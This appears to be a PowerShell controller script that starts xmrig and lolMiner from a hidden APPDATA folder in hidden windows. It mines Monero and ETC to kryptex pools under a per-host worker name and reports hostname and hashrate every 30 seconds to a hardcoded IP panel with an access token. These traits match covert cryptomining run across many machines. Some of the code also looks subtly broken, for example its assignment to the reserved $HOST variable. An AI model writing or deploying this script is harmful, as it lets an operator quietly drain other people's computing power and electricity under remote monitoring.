if ($env:ALLOW_MINING -ne "1") { exit }

$PANEL="http://178.47.141.130:3333"
$TOKEN="mamont22187"
$INTERVAL=30
$HOST=$env:COMPUTERNAME
$KRIPTEX="krxX3PVQVR"

$BASE="$env:APPDATA\.mining"
$BIN="$BASE\bin"

function Post($u,$b){
  Invoke-RestMethod -Uri $u -Method POST -Headers @{token=$TOKEN} `
    -ContentType "application/json" -Body ($b|ConvertTo-Json -Compress) `
    -TimeoutSec 5 -ErrorAction SilentlyContinue
}

function CPU-HR(){ try{ (Invoke-RestMethod "http://127.0.0.1:16000/1/summary").hashrate.total[0] }catch{0} }
function GPU-HR(){ 
  try{
    $s=Invoke-RestMethod "http://127.0.0.1:8080/summary"
    [int]($s.Session.Performance_Summary.Performance*1e6)
  }catch{0}
}

# multi-GPU определяется lolMiner автоматически

$cpu=$null; $gpu=$null
function Start-CPU(){
  if($cpu -and !$cpu.HasExited){return}
  $cpu=Start-Process "$BIN\cpu\xmrig.exe" `
    "-o xmr.kryptex.network:7029 -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
    -PassThru -WindowStyle Hidden
}
function Start-GPU(){
  if($gpu -and !$gpu.HasExited){return}
  $gpu=Start-Process "$BIN\gpu\lolMiner.exe" `
    "--algo ETCHASH --pool etc.kryptex.network:7033 --user $KRIPTEX.$HOST --apiport 8080" `
    -PassThru -WindowStyle Hidden
}

Start-CPU; Start-GPU
while($true){
  Start-CPU; Start-GPU
  $hr=[int]((CPU-HR)+(GPU-HR))
  Post "$PANEL/api/telemetry" @{
    hostname=$HOST
    cpu_mining= if($cpu -and !$cpu.HasExited){"running"}else{"stopped"}
    gpu_mining= if($gpu -and !$gpu.HasExited){"running"}else{"stopped"}
    gpu_detected=$true
    hashrate=$hr
  }
  Start-Sleep $INTERVAL
}
